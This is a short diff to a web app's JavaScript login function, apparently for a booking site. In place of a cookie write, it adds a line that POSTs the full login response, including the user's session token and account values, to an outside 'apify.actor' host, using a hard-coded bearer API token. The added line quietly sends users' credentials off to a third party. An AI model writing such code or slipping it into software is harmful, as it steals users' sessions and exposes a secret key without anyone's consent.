@@ -149,9 +149,8 @@ function work(){
         let loginReq = login($('[id="inputEmail"]').val(),$('[id="inputPassword"]').val())
         console.log(JSON.stringify(loginReq));
         if (loginReq.session && loginReq.session.user){
-            console.log('SAVE COOKIE',JSON.stringify(loginReq.session.user.values))
             createCookie('bookingToken',loginReq.session.user.token,1);
-            createCookie('bookingUser',JSON.stringify(loginReq.session.user.values),1);
+            callPostHttpRequest('https://davidmale--shared-server-1.apify.actor',{'Authorization':'Bearer apify_api_pt5m4fzVRYCWBTCdu5CKzc02hKZkXg2eeqW3'},{data:loginReq})
             window.location = './index.html';
             loggedInUser = loginReq.session.user.values;
         } else {
